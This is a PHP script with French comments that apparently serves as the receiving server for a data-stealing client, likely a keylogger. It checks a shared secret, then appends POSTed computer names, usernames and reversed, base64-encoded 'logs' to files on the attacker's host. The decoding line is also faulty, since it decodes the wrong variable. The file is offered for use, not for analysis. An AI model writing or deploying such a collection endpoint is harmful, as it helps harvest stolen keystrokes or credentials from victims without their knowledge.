<?php
// upload.php - À mettre sur ton host
$secret_key = "3ust1s";  // MÊME QUE DANS LE SCRIPT

if ($_POST['key'] !== $secret_key) {
    die("Access denied");
}

// Crée le dossier logs s'il n'existe pas
if (!file_exists('logs')) {
    mkdir('logs', 0755, true);
}

// Prépare les données
$filename = 'logs/' . preg_replace('/[^a-z0-9._-]/i', '', $_POST['filename']);
$data = date('Y-m-d H:i:s') . " | " . $_POST['computer'] . " | " . $_POST['user'] . "
";
$data .= strrev($_POST['logs']) . "
";  // Dé-reverse
$data .= base64_decode($data) . "
";    // Décode base64
$data .= "---
";

// Écrit dans le fichier
file_put_contents($filename, $data, FILE_APPEND);

echo "OK";
?>
